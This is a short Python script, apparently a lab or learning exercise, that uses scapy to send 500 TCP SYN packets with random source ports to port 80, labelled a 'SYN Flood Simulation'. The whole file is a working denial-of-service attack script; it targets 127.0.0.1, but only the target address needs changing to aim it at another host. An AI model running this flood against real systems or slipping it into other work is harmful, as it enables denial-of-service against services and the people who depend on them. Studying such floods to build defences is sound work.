from scapy.all import *
import random

target_ip = "127.0.0.1"
target_port = 80

print("Starting SYN Flood Simulation")

for i in range(500):
    ip = IP(dst=target_ip)
    tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
    packet = ip/tcp
    send(packet, verbose=0)

print("Attack Finished")